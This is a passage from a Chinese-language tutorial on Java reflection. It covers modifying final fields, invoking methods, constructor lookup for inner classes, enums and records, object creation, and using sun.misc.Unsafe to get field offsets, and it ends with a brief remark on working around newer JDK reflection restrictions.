<h3 id="修改-final-变量"><a href="#修改-final-变量" class="headerlink" title="修改 final 变量"></a>修改 final 变量</h3><p>如果是 <code>final</code> 修饰的成员，即使通过反射也无法直接修改，这是由于 <code>Field</code> 对象的 <code>modifiers</code> 成员的 <code>FINAL</code> 位置位导致的。</p>
<p><code>Field</code> 对象的 <code>modifiers</code> 成员用于表示字段的访问修饰符（如 <code>public</code>、<code>private</code>、<code>static</code>、<code>final</code> 等）。这个成员变量是一个整数值，表示该字段的修饰符组合。我们可以先通过反射修改 <code>Field</code> 对象的 <code>modifiers</code> 成员，然后再反射修改成员变量。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getDeclaredField(object.getClass(), fieldName);</span><br><span class="line">    </span><br><span class="line">    <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> getDeclaredField(field.getClass(), <span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    </span><br><span class="line">    field.set(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>我们在验证常量是否修改时不能直接通过属性访问获取常量的值。因为 Java 编译器在编译的时候会认为常量不可修改，导致直接通过属性访问获取常量值的操作的过程会被优化掉，获取的结果还是原来的值。</p>
<p>例如下面的测试代码中：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FinalTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FinalTest</span>();</span><br><span class="line">setFieldValue(test,<span class="string">&quot;secret&quot;</span>,<span class="string">&quot;G0T_Y0U&quot;</span>);</span><br><span class="line">System.out.println(test.secret);</span><br><span class="line">System.out.println(getFieldValue(test,<span class="string">&quot;secret&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<p><code>System.out.println(test.secret);</code> 的 <code>test.secret</code> 会被优化成 <code>secret</code> 原本的值造成常量未被修改的假象。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDC &quot;Y0U_C4nNot_M0d1fy_M3&quot;</span><br><span class="line">INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/String;)V</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><p>反射提供了两种方法来获取类的方法信息：</p>
<ul>
<li><p><strong><code>getMethod(String name, Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>公共方法</strong>（包括从父类继承的公共方法）。如果方法不存在或者不是 <code>public</code>，会抛出 <code>NoSuchMethodException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method <span class="title function_">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>name</code></strong> ：方法名。</li>
<li><strong><code>parameterTypes</code></strong> ：方法参数类型列表。<strong>如果方法没有参数，可以传递空数组或省略。</strong></li>
</ul>
</li>
<li><p><strong><code>getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>当前类声明的方法</strong>（包括 <code>private</code> 和 <code>protected</code> 方法，但不包括继承的方法）。如果方法不存在，则抛出 <code>NoSuchMethodException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method <span class="title function_">getDeclaredMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>同样的，我们可以实现一个可以获取从父类继承的方法的 <code>getDeclaredMethod</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Method <span class="title function_">getDeclaredMethod</span><span class="params">(Class&lt;?&gt; clazz, String methodName, Class&lt;?&gt;... parameterTypes)</span> &#123;</span><br><span class="line">    <span class="comment">// 使用 while 循环遍历类及其父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试获取当前类的指定方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(methodName, parameterTypes);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="comment">// 如果当前类没有该方法，则继续查找父类</span></span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果找不到方法，返回 null</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反射还提供了 <code>getMethods()</code> 和 <code>getDeclaredMethods()</code> 方法来获取类的所有方法：</p>
<ul>
<li><p><strong><code>getMethods()</code></strong> ：返回当前类及其父类中所有公共方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method[] getMethods() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredMethods()</code></strong> ：返回当前类中所有声明的方法（包括私有方法）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><p>使用 <code>Method</code> 对象的 <code>invoke(Object obj, Object... args)</code> 方法可以调用类的方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span> <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>obj</code> 是调用方法的对象，<strong>如果方法是 <code>static</code>，需要传入 <code>null</code> 占位。</strong></li>
<li><code>args</code> 是方法的参数。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8bc937d444c74ad898b27e30d6688afb.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
对于连续调用的情况，由于反射调用时对象是作为参数传入的，因此方法的书写顺序发生改变。
  ![invoke](images/invoke.svg)


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p>通过反射获取的方法如果因可见性规则无法直接调用，必须在调用前先执行 <code>setAccessible(true)</code>，否则会抛出 <code>IllegalAccessException</code>；</p>
</li>
<li><p><strong><code>Method</code> 绑定的是“声明它的类型”而不是具体实例。</strong>只要目标对象是该类型或其子类&#x2F;实现类，用这个 <code>Method#invoke</code> 调就行；<strong>真正执行哪个方法体</strong>取决于目标对象的<strong>实际运行时类型</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">I</span> &#123; <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">I</span> &#123; <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>&#123; System.out.println(<span class="string">&quot;A&quot;</span>); &#125; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123; <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>&#123; System.out.println(<span class="string">&quot;B&quot;</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">I</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">mI</span> <span class="operator">=</span> I.class.getMethod(<span class="string">&quot;f&quot;</span>); <span class="comment">// 声明者：I</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">mA</span> <span class="operator">=</span> A.class.getMethod(<span class="string">&quot;f&quot;</span>); <span class="comment">// 声明者：A</span></span><br><span class="line"></span><br><span class="line">mI.invoke(x); <span class="comment">// 输出 B   ✅（接口 Method 调到 B.f）</span></span><br><span class="line">mA.invoke(x); <span class="comment">// 仍然输出 B ✅（A 的 Method 也调到 B.f）</span></span><br><span class="line">System.out.println(mI.equals(mA)); <span class="comment">// false（声明者不同）</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>归属</strong>：<code>method.getDeclaringClass()</code> 指出它在哪个类型上声明。<br> <code>I.class.getMethod(&quot;f&quot;)</code> 和 <code>C.class.getMethod(&quot;f&quot;)</code> 是<strong>两个不同</strong>的 <code>Method</code>（声明者不同）。</li>
<li><strong>可用范围</strong>（实例方法）：<code>invoke(target, …)</code> 要求 <code>target</code> 是 <code>declaringClass</code> 的实例&#x2F;子类；若 <code>declaringClass</code> 是接口，则 <code>target</code> <strong>实现了该接口</strong>即可。</li>
<li><strong>实际执行体</strong>：无论你拿的是接口上的 <code>Method</code> 还是实现类上的 <code>Method</code>，<strong>最终执行</strong>都按目标对象的<strong>实际类型</strong>来决定（覆盖 → 调子类实现）。</li>
</ul>
</li>
</ul>

    </div>
  </div>

<h2 id="操作构造函数"><a href="#操作构造函数" class="headerlink" title="操作构造函数"></a>操作构造函数</h2><h3 id="获取构造函数"><a href="#获取构造函数" class="headerlink" title="获取构造函数"></a>获取构造函数</h3><p>Java 反射提供了两种方法来获取类的构造函数：</p>
<ul>
<li><p><strong><code>getConstructor(Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>公共构造函数</strong>，如果当前类没有公共构造函数则尝试获取父类中的公共构造函数。如果找不到公共构造函数则会抛出 <code>NoSuchMethodException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;T&gt; <span class="title function_">getConstructor</span><span class="params">(Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong><code>parameterTypes</code></strong> ：构造函数参数类型列表。<strong>如果构造函数没有参数，可以传递空数组或省略。</strong></li>
</ul>
</li>
<li><p><strong><code>getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</code></strong> ：获取 <strong>当前类声明的构造函数</strong>（包括 <code>private</code> 和 <code>protected</code> 构造函数，但不包括继承的构造函数）。如果构造函数不存在，则抛出 <code>NoSuchMethodException</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;T&gt; <span class="title function_">getDeclaredConstructor</span><span class="params">(Class&lt;?&gt;... parameterTypes)</span> <span class="keyword">throws</span> NoSuchMethodException</span><br></pre></td></tr></table></figure></div></li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 Java 里，一个类可以定义多个重载的构造器；只有当这个类<strong>完全没有</strong>自己声明任何构造器时，编译器才会<strong>隐式生成一个无参构造器</strong>，它的可见性与类一致，并且默认第一句是调用 <code>super()</code>。</p>
<p>一旦你在类里<strong>声明了任意构造器</strong>（哪怕只有一个带参数的），这个隐式的无参构造器就<strong>不会再生成</strong>；如果你仍然希望能写 <code>new Example()</code>，就需要<strong>显式</strong>补上 <code>Example(){}</code>。</p>
<p>在反射层面，只有当类里<strong>真的存在</strong>无参构造器时，<code>Example.class.getDeclaredConstructor()</code> 才会成功；如果类里没有无参构造器（例如只声明了带参的那个），调用就会抛 <code>NoSuchMethodException</code>。</p>
<p>另外要留意一些特殊形态：非静态内部类在字节码上有隐藏的“外部类实例”参数，<code>enum</code> 和大多数 <code>record</code> 也没有真正的无参构造器，因此这些场景都不要依赖“默认无参构造器”的假设。</p>
<p>非静态内部类每个实例都必须隶属于一个外部类实例，因此它的构造器在字节码里会额外带上一个“外部类实例”的隐藏参数。写代码时你看见的是 <code>Inner()</code>，但反射看到的其实是类似 <code>(Outer)</code> 的构造器，所以用空参数拿不到，必须带上 <code>Outer.class</code> 才行，例如：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Inner</span> &#123; Inner() &#123;&#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建需要外部实例：</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Outer</span>().<span class="keyword">new</span> <span class="title class_">Inner</span>();           <span class="comment">// ✅</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Outer</span>.Inner();                 <span class="comment">// ❌</span></span><br><span class="line"></span><br><span class="line">Outer.Inner.class.getDeclaredConstructor();                 <span class="comment">// ❌ NoSuchMethodException</span></span><br><span class="line">Outer.Inner.class.getDeclaredConstructor(Outer.class);      <span class="comment">// ✅</span></span><br></pre></td></tr></table></figure></div>

<p>带一提，<strong>静态内部类</strong>（<code>static class</code>）不带外部实例参数，它的构造器就跟普通顶层类一样；是否有无参仍然取决于你有没有自己声明过其它构造器。</p>
<p>枚举就算你源码里写了 <code>Color(){}</code>，编译器也会在构造器里偷偷加上 <code>(String name, int ordinal)</code> 这两个参数来记录常量名和序号，所以反射层面它并不是“无参”。你会看到空参拿不到，而能看到一个形如 <code>(String, int)</code> 的构造器：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123; RED; Color() &#123;&#125; &#125;</span><br><span class="line"></span><br><span class="line">Color.class.getDeclaredConstructor(); <span class="comment">// ❌</span></span><br><span class="line"><span class="keyword">for</span> (Constructor&lt;?&gt; c : Color.class.getDeclaredConstructors()) &#123;</span><br><span class="line">  System.out.println(java.util.Arrays.toString(c.getParameterTypes()));</span><br><span class="line">  <span class="comment">// 通常会打印: [class java.lang.String, int]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>record 的“正则构造器”参数就是它的所有组件；比如 <code>record Point(int x, int y) {}</code> 的构造器就是 <code>(int, int)</code>，自然不是无参，只有“零组件”的记录类 <code>record Empty(){}</code> 才会是无参：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Point</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;&#125;</span><br><span class="line">Point.class.getDeclaredConstructor();                    <span class="comment">// ❌</span></span><br><span class="line">Point.class.getDeclaredConstructor(<span class="type">int</span>.class, <span class="type">int</span>.class); <span class="comment">// ✅</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">record</span> <span class="title class_">Empty</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">Empty.class.getDeclaredConstructor(); <span class="comment">// ✅</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>有些情况下，我们想要获取的构造函数位于父类中且访问类型不为 <code>public</code>，此时需要参考前面的方法使用逐级查找父类的方式来获取：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getDeclaredConstructor(Class&lt;?&gt; clazz, Class&lt;?&gt;... parameterTypes) &#123;</span><br><span class="line">    <span class="comment">// 使用 while 循环遍历类及其父类</span></span><br><span class="line">    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Constructor&lt;T&gt; constructor = clazz.getDeclaredConstructor(parameterTypes);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> constructor;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            clazz = clazz.getSuperclass();  <span class="comment">// 如果当前类没有该构造函数，则继续查找父类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>反射还提供了 <code>getConstructors()</code> 和 <code>getDeclaredConstructors()</code> 方法来获取类的所有构造函数：</p>
<ul>
<li><p><strong><code>getConstructors()</code></strong> ：返回当前类及其父类中所有公共构造函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;?&gt;[] getConstructors() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>getDeclaredConstructors()</code></strong> ：返回当前类中所有声明的构造函数（包括私有构造函数）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Constructor&lt;?&gt;[] getDeclaredConstructors() <span class="keyword">throws</span> SecurityException</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>首先 <code>Class</code> 对象本身的 <code>newInstance</code> 方法可以调用类的无参构造函数创建类的实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">newInstance</span><span class="params">()</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException;</span><br></pre></td></tr></table></figure></div>

<p>不过这个方法只能调用无参构造函数，且私有的构造函数无法调用，因此比较鸡肋。</p>
<p>另外从 Java 9 开始，<code>Class.newInstance()</code> 方法已经被标记为<strong>废弃</strong>（deprecated）。推荐使用 <code>Constructor.newInstance()</code> 代替它。</p>
<p>我们可以先获取类的<strong>指定构造函数</strong>对应的 <code>Constructor</code> 对象，然后调用 <code>Constructor</code> 对象的 <code>newInstance(Object... initargs)</code> 方法从而调用类的构造函数实例化类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">newInstance</span><span class="params">(Object... initargs)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无参构造</span></span><br><span class="line"><span class="type">T</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定参数的构造</span></span><br><span class="line">Constructor&lt;T&gt; c = clazz.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);                 <span class="comment">// 访问非 public 构造时需要</span></span><br><span class="line"><span class="type">T</span> <span class="variable">obj2</span> <span class="operator">=</span> c.newInstance(<span class="string">&quot;Alice&quot;</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="Unsafe-类"><a href="#Unsafe-类" class="headerlink" title="Unsafe 类"></a>Unsafe 类</h2><p><code>sun.misc.Unsafe</code> 是 Java 中一个极为强大且危险的类。它提供了对底层内存和线程操作的直接访问能力，允许开发者绕过 Java 的安全机制、访问底层内存、进行 CAS 操作、创建对象、操作字段等。这种能力虽然强大，但使用不当极容易导致内存泄漏、程序崩溃、数据不一致，甚至破坏 JVM 的稳定性。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>Unsafe</code> 类主要是通过 JVM 内部的 <strong>native（本地方法）</strong> 来实现的上述功能，并没有用到反射技术。但是这个类在操作类的方面与反射功能上有重合之处，并且可以帮助反射绕过一些高版本 JDK 的限制，因此放在这里介绍并且只介绍与字段操作有关的内容。</p>

    </div>
  </div>

<h3 id="获取-Unsafe-实例"><a href="#获取-Unsafe-实例" class="headerlink" title="获取 Unsafe 实例"></a>获取 Unsafe 实例</h3><p><code>Unsafe</code> 的构造器是私有的，且 <code>theUnsafe</code> 字段是私有的，需要通过反射获取。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>从 Java 9 开始，<code>Unsafe</code> 受到更严格的模块限制，需添加启动参数：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/sun.misc=ALL-UNNAMED</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="获取字段的偏移量"><a href="#获取字段的偏移量" class="headerlink" title="获取字段的偏移量"></a>获取字段的偏移量</h3><p>由于 <code>Unsafe</code> 是在内存层面对象的字段，因此 <code>Unsafe</code> 在操作指定字段之前需要先获取字段的偏移量。<code>Unsafe</code> 提供了两种方法来分别获取获取普通对象和静态字段的偏移量：</p>
<ul>
<li><strong><code>objectFieldOffset(Field field)</code></strong> ：用于获取普通对象字段的偏移量。</li>
<li><strong><code>staticFieldOffset(Field field)</code></strong> ：用于获取静态字段的偏移量。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Unsafe 实例</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ageField</span> <span class="operator">=</span> User.class.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">ageOffset</span> <span class="operator">=</span> unsafe.objectFieldOffset(ageField);</span><br><span class="line">System.out.println(<span class="string">&quot;Age Offset: &quot;</span> + ageOffset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> User.class.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">nameOffset</span> <span class="operator">=</span> unsafe.staticFieldOffset(nameField);</span><br><span class="line">System.out.println(<span class="string">&quot;Name Offset: &quot;</span> + nameOffset);</span><br></pre></td></tr></table></figure></div>

<p>获取字段的内存偏移量需要我们反射获取字段对应 <code>Field</code> 对象，这也意味着如果我们能够获取到字段对应的 <code>Field</code> 对象那么我们就可以绕过反射的所有限制。因此<strong>高版本反射绕过本质上就是围绕如何获取 <code>Field</code> 对象展开的。</strong></p>
<p>由于我们获取 <code>Field</code> 对象本身是为了获取字段的内存偏移量，因此其中一个绕过方法就是通过用 <code>Unsafe#defineAnonymousClass(host, bytes, null)</code>，喂入原始字节码得到一个 <strong>匿名副本类</strong>。它和原类的字段布局完全一致（字节码一样 → 静态字段位置相同），但不是黑名单里的本体，因此可以自由反射获取字段。</p>
